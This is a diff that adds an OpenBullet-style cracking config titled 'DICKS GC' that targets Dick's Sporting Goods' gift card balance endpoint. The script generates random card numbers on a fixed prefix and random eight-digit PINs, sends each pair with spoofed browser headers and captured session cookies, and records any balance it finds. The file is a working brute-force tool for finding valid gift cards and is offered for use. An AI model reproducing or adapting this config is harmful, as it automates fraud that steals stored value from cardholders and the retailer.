@@ -1,0 +1,63 @@
+[SETTINGS]
+{
+  "Name": "DICKS GC",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-08T00:05:26.7152233-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION RandomString "614913099456?d?d?d?d" -> CAP "CODE" 
+
+FUNCTION RandomString "?d?d?d?d?d?d?d?d" -> CAP "PIN" 
+
+REQUEST GET "https://www.dickssportinggoods.com/AjaxGiftCardCheckBalance?accountNumber=<CODE>&pin=<PIN>&storeId=15108" 
+  
+  HEADER "Host: www.dickssportinggoods.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.dickssportinggoods.com/s/gift-cards" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Cookie: whereabouts=10001; dih=desktop; NNC=1; swimlane_as_exp_dsg=15; dsg_perf_analysis=NB-0; ak_bmsc=41400936000710B59AA6CE7C13EBE7A2173BFAA4AD090000B0D8B45ED21DF042~plkkcKGcUG7BLJ2ejGGBi/FHBZk+2EvMJRUAHs9EYsP50awRyZ1b0KnXpaxOPw8u7I4rAuJRK+23r7noaW0/1rXg5uzv2g2KA7TNhApw2gcnpkVlK+vRvC2BbgwN/jsPp9Sm/7L6gMVGZvoUkuPFPgyYUH8oMhS8/EChxfbTxmm6IHqUUZ54qMCOFF9mhS9tidyI1Yh76IvNrYGKbz/vYC53HWvzAJCR4C3ZJ6k2i9+Dao5KHqsPbm2udqZ4QrJlB5; akaas_AS_EXP_DSG=2147483647~rv=15~id=be8f6bd136304410685f51a5e6d139f1; bm_sz=2C851D8F50BD5261E7BCAC69FFDB63F1~YAAQpPo7FzGgbtFxAQAASXJu8gcsu7uC4U26fmMDUdyhKaTO/fzvQTHIwFNwB9x2/4dXQack4HqoZiOgcGHcI7xp3JcXvqDhD93qHmsM0ptcPYJxko62XzA6GO3HG4a4ixUL9va9GAazjr/gF00sdEZgKYK9mwptH+oJEif52Qr75SIX2cGT4wR1GrjexZBwVfiIKIvKMyZMCUw=; eWalletApay=MVP1; check=true; mbox=session#6d6e42adc5984d409f3cae726565cc9d#1588912118; AMCVS_989E1CFE5329630F0A490D45%40AdobeOrg=1; RES_TRACKINGID=705480615722139; ResonanceSegment=1; RES_SESSIONID=313395205362445; bde0817376cf2020-03-17T16:59:07_modal=bde0817376cf2020-03-17T16:59:07_modal; locationAllowed=N; DCSG_NGX_CUST_STORE=11385_MIDDLE%20VILLAGE_1406; setStoreCookie=11385_MIDDLE%20VILLAGE_1406; akaalb_Customer_Engagement_ALB=~op=Customer_Engagement_Static_ALB:illiad_static_Azure|Customer_Engagement_ALB:Odyssey_homepage_Azure|~rv=27~m=illiad_static_Azure:0|Odyssey_homepage_Azure:0|~os=b834769be1dd4d72381443d311536027~id=48d1ed2f260c4ba841bf83baf0a2cf98; JSESSIONID=0000-kgISy3epyXw90ZKH_qdQVU:JVMA5075; WC_PERSISTENT=4qAx3f4paMCNXxRXCDEt0sWqZPc%3D%0A%3B2020-05-07+23%3A58%3A10.225_1588910290225-124014_0; DSG_UID=32f4eb43-0cda-4b7f-9f44-528b77774fa8; BIGipServer~dc1_ec_dmz_prod1_partition~dsg_wcs_web_ihs_http_pool=; REGION=1; f5_cspm=1234; s_sess=%20s_sq%3D%3B%20s_cc%3Dtrue%3B; utag_main=v_id:0171f26e73aa001921a0ffaf5d1c03073002306b00978$_sn:1$_se:7$_ss:0$_st:1588912152360$ses_id:1588910257068%3Bexp-session$_pn:7%3Bexp-session; DCSG_NGX_CUST=%7B%22accountType%22%3A%22guest%22%2C%22sessionId%22%3A%224dca0752-4007-4985-a74b-6e5300057317%22%2C%22userId%22%3A%22-1002%22%2C%22visitCount%22%3A5%2C%22expires%22%3A%222020-06-07T03%3A57%3A37.584Z%22%7D; authTokens=%7B%22type%22%3A%22guest%22%2C%22visits%22%3A5%2C%22expires%22%3A%222020-06-07T03%3A57%3A37.584Z%22%2C%22sessionId%22%3A%224dca0752-4007-4985-a74b-6e5300057317%22%7D;" 
+
+KEYCHECK 
+  KEYCHAIN Success AND 
+    KEY "gcBalanceAmount" 
+  KEYCHAIN Failure OR 
+    KEY "Gift Card Connection Error" 
+    KEY "Gift Card Invalid" 
+
+PARSE "<SOURCE>" LR "gcBalance\": \"" "\"" CreateEmpty=FALSE -> CAP "BAL" 
+
